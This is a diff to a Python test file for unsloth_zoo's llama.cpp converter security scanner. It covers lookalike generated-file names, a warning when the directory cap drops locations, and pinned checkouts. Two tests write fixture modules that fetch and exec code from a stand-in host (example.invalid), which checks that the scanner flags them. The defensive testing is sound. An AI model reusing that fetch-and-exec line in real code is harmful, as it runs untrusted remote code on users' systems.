@@ -1638,7 +1638,7 @@ def test_each_root_directory_is_its_own_bounded_location(tmp_path, monkeypatch):
         big.mkdir(parents = True)
         (big / "buried.py").write_text("VALUE = 1\n", encoding = "utf-8")
 
-    locations = llama_cpp._scanned_locations(str(root))
+    locations = llama_cpp._scanned_locations(str(root)).locations
     by_label = {location.label: location for location in locations}
     assert set(by_label) == {"conversion", ".", "ggml", "examples", "tools"}, sorted(by_label)
     # The root walks its own files only; everything else is reached as itself.
@@ -1757,7 +1757,7 @@ def test_the_key_ignores_the_converter_this_module_writes(tmp_path, monkeypatch)
     llama_cpp = _load("llama_cpp_generated_key_probe", "unsloth_zoo/llama_cpp.py")
 
     root = _package_root(tmp_path)
-    generated = root / f"{llama_cpp.GENERATED_CONVERTER_PREFIX}.py"
+    generated = root / llama_cpp.GENERATED_CONVERTER_NAME
     generated.write_text("# patched\n", encoding = "utf-8")
 
     for disabled in ("1", ""):
@@ -1789,8 +1789,91 @@ def test_the_number_of_scan_locations_is_bounded(tmp_path):
     for index in range(llama_cpp.MAX_SCAN_LOCATIONS * 3):
         (root / f"dir_{index:04d}").mkdir()
 
-    locations = llama_cpp._scanned_locations(str(root))
-    assert len(locations) <= llama_cpp.MAX_SCAN_LOCATIONS, len(locations)
+    plan = llama_cpp._scanned_locations(str(root))
+    assert len(plan.locations) <= llama_cpp.MAX_SCAN_LOCATIONS, len(plan.locations)
+    assert plan.truncated is True, "dropping directories has to be reported"
+
+
+def test_a_module_merely_named_like_the_generated_one_is_still_scanned(
+    tmp_path, monkeypatch
+):
+    """The exclusion was a prefix test applied in every directory.
+
+    So conversion/unsloth_convert_hf_to_gguf_payload.py was dropped from the scan
+    and from the key, and a clean __init__.py could import and run it. Only the
+    exact generated file, and only where this module writes it, is excluded.
+    """
+    llama_cpp = _load("llama_cpp_generated_exact_probe", "unsloth_zoo/llama_cpp.py")
+
+    root = _package_root(tmp_path)
+    stem = llama_cpp.GENERATED_CONVERTER_NAME[: -len(".py")]
+    lookalike = root / "conversion" / f"{stem}_payload.py"
+    lookalike.write_text(
+        "import requests\nexec(requests.get('http://example.invalid/p').text)\n",
+        encoding = "utf-8",
+    )
+
+    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
+    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
+    with pytest.raises(llama_cpp.ConverterScanError):
+        llama_cpp._scan_conversion_package(str(root))
+
+    # A file by the same name one directory down is not the generated one either.
+    (root / "conversion" / llama_cpp.GENERATED_CONVERTER_NAME).write_text(
+        "import requests\nexec(requests.get('http://example.invalid/q').text)\n",
+        encoding = "utf-8",
+    )
+    lookalike.unlink()
+    with pytest.raises(llama_cpp.ConverterScanError):
+        llama_cpp._scan_conversion_package(str(root))
+
+
+def test_dropping_directories_past_the_cap_is_reported(tmp_path, monkeypatch, caplog):
+    """The cap stopped collecting locations and said nothing.
+
+    A root wide enough to reach it is nowhere near the 4096-entry budget that
+    would otherwise have spoken, so a payload in a directory landing past the cap
+    went unscanned in silence, strict mode included.
+    """
+    llama_cpp = _load("llama_cpp_location_cap_report_probe", "unsloth_zoo/llama_cpp.py")
+
+    root = _package_root(tmp_path)
+    for index in range(llama_cpp.MAX_SCAN_LOCATIONS + 5):
+        (root / f"dir_{index:04d}").mkdir()
+
+    monkeypatch.delenv("UNSLOTH_CONVERTER_SCAN_STRICT", raising = False)
+    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
+    caplog.clear()
+    with caplog.at_level(logging.WARNING):
+        llama_cpp._scan_conversion_package(str(root))
+    assert any("directories this scan" in r.message for r in caplog.records), (
+        [r.message for r in caplog.records]
+    )
+
+    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
+    with pytest.raises(llama_cpp.ConverterScanError, match = "directories this scan"):
+        llama_cpp._scan_conversion_package(str(root))
+
+
+def test_the_sibling_scan_does_not_rewrite_a_pinned_checkout(tmp_path, monkeypatch):
+    """The outer purge declined to touch a pinned checkout and the sibling scan
+    reached straight past it and deleted the caches anyway. My earlier test only
+    covered the outer path, which is how this survived."""
+    llama_cpp = _load("llama_cpp_pinned_inner_purge_probe", "unsloth_zoo/llama_cpp.py")
+
+    root = _package_root(tmp_path)
+    cache = root / "conversion" / "__pycache__"
+    cache.mkdir()
+    theirs = cache / "base.cpython-313.pyc"
+    theirs.write_bytes(_pyc(0))
+
+    monkeypatch.delenv("UNSLOTH_CONVERTER_SCAN_STRICT", raising = False)
+    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
+    llama_cpp._scan_conversion_package(str(root), is_local_copy = True)
+    assert theirs.exists(), "the sibling scan rewrote a checkout the user pinned"
+
+    llama_cpp._scan_conversion_package(str(root), is_local_copy = False)
+    assert not theirs.exists()
 
 
 def _package_root(tmp_path):
